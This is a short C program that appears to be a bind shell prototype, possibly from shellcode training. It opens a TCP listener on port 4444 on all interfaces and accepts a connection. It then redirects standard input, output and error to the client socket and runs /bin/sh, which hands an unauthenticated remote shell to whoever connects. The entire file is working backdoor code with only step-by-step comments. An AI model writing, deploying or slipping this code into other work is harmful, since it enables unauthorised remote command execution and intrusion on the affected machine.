#include<stdlib.h>
#include<sys/socket.h>
#include<sys/types.h>
#include<netinet/in.h>
#include<strings.h>
#include<unistd.h>


#define BIND_PORT	4444


main(int argc, char **argv)
{
	int i, ret;
	int socketServer;
	int socketClient;

	char *args[] = { "/bin/sh", 0 };

	struct sockaddr_in server;
	struct sockaddr_in client;
	int sockaddr_len = sizeof(struct sockaddr_in);


	// Create a socket
	socketServer = socket(AF_INET, SOCK_STREAM, 0);
	if (socketServer == -1)
	{
		exit(-1);
	}

	// Bind it to a local port
	server.sin_family = AF_INET;
	server.sin_port = htons(BIND_PORT);
	server.sin_addr.s_addr = INADDR_ANY;
	bzero(&server.sin_zero, 8);

	ret = bind(socketServer, (struct sockaddr *) &server, sockaddr_len);
	if(ret == -1)
	{
		exit(-1);
	}

	// Start listening
	ret = listen(socketServer, 2);
	if(ret == -1)
	{
		exit(-1);
	}

	// Accept the incoming connection
	socketClient = accept(socketServer, (struct sockaddr *) &client, &sockaddr_len);
	if(socketClient == -1)
	{
		exit(-1);
	}

	// Close the listening socket
	close(socketServer);

	// Duplicate file descriptors
	for (i=0; i<=2; i++)
	{
		dup2(socketClient, i);
	}

	// Execute /bin/sh
	execve(args[0], &args[0], NULL);
}
